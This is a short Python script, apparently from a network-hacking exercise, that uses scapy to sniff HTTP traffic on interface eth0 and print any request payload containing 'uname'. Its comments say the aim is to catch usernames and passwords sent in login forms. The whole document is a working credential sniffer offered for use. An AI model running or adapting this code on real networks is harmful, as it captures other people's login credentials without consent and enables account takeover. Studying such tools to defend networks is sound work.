
#in some other web site it may not send uname and pass in load field
#instead load may contain other stuffs which is not useful to us
#chk if username is there in load or not if yes print else dont print anything
import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        if packet.haslayer(scapy.Raw):
           load = packet[scapy.Raw].load
           if "uname" in load: #username is substring
                print(load)

sniff("eth0")